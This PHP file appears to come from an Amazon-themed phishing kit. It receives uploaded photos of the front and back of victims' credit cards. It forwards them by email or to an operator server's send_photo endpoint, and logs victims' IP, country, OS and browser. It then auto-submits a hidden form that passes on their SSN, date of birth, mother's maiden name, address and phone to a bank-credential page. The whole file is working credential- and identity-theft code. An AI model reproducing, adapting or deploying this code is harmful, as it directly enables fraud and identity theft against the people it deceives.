<?php
session_start();
require_once('../main.php');
$random = rand(0,100);
$from = $_POST['fname'];
$ip = getUserIP();
if (isset($_FILES["file1"]["type"])) {
    $validextensions = array("jpeg", "jpg", "png");
    $temporary = explode(".", $_FILES["file1"]["name"]);
    $file_extension = end($temporary);
    if ((($_FILES["file1"]["type"] == "image/png") || ($_FILES["file1"]["type"] == "image/jpg") || ($_FILES["file1"]["type"] == "image/jpeg"))) {
        $sourcePath = $_FILES['file1']['tmp_name'];
        $targetPath = "../upload/frontcc_".$from."_". $_FILES["file1"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
         $content = file_get_contents($targetPath);
         $content = chunk_split(base64_encode($content));
         $uid = md5(uniqid(time()));
         $filename = basename($targetPath);
         $headers = "From: AMAZON PAP <".$sender_mail.">" . "\r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";

         $message = "--".$uid."\r\n";
         $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
         $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
         $message .= $message."\r\n\r\n";
         $message .= "--".$uid."\r\n";
         $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
         $message .= "Content-Transfer-Encoding: base64\r\n";
         $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
         $message .= $content."\r\n\r\n";
         $message .= "--".$uid."--";
         $to = $email_result;
         $subject = "FRONT CC: ".$_POST['email']." [ $cn - $os - $ip ]";
         if ($send_login == "email") {
            mail($to, $subject, $message, $headers, $targetPath);
         }else{
            $message = 'message=https://'.$domain.'/upload/frontcc_'.$from.'_'.$_FILES["file1"]["name"];
            $url = 'http://'.$set_ip.'/api/send_photo?domain='.$domain;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
            $res = curl_exec($ch);
            curl_close($ch);
         }
         tulis_file("../result/pap.txt", $ip);
         tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|FRONT - PAP CC");
    }
} else {
}
if (isset($_FILES["file2"]["type"])) {
    $validextensions = array("jpeg", "jpg", "png");
    $temporary = explode(".", $_FILES["file2"]["name"]);
    $file_extension = end($temporary);
    if ((($_FILES["file2"]["type"] == "image/png") || ($_FILES["file2"]["type"] == "image/jpg") || ($_FILES["file2"]["type"] == "image/jpeg"))) {
        $sourcePath = $_FILES['file2']['tmp_name'];
        $targetPath = "../upload/backcc_".$from."_". $_FILES["file2"]["name"];
        move_uploaded_file($sourcePath,$targetPath);
         $content = file_get_contents($targetPath);
         $content = chunk_split(base64_encode($content));
         $uid = md5(uniqid(time()));
         $filename = basename($targetPath);
         $headers = "From: AMAZON PAP <".$sender_mail.">" . "\r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";

         $message = "--".$uid."\r\n";
         $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
         $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
         $message .= $message."\r\n\r\n";
         $message .= "--".$uid."\r\n";
         $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
         $message .= "Content-Transfer-Encoding: base64\r\n";
         $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
         $message .= $content."\r\n\r\n";
         $message .= "--".$uid."--";
         $to = $email_result;
         $subject = "BACK CC: ".$_POST['email']." [ $cn - $os - $ip ]";
         if ($send_login == "email") {
            mail($to, $subject, $message, $headers, $targetPath);
         }else{
            $message = 'message=https://'.$domain.'/upload/backcc_'.$from.'_'.$_FILES["file2"]["name"];
            $url = 'http://'.$set_ip.'/api/send_photo?domain='.$domain;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
            $res = curl_exec($ch);
            curl_close($ch);
         }
         tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BACK - PAP CC");
    }
} else {
}
if ($get_bank == "on") {
echo "<form id='boyxd' method='POST' action='../bank'>
<input type='hidden' name='email' value='".$_POST['email']."'>
<input type='hidden' name='fname' value='".$_POST['fname']."'>
<input type='hidden' name='state' value='".$_POST['state']."'>
<input type='hidden' name='city' value='".$_POST['city']."'>
<input type='hidden' name='address' value='".$_POST['address']."'>
<input type='hidden' name='zip' value='".$_POST['zip']."'>
<input type='hidden' name='dob' value='".$_POST['dob']."'>
<input type='hidden' name='phone' value='".$_POST['phone']."'>
<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
<input type='hidden' name='mmn' value='".$_POST['mmn']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
echo "<form id='boyxd' method='POST' action='../done'>
<input type='hidden' name='email' value='".$_POST['email']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}

?>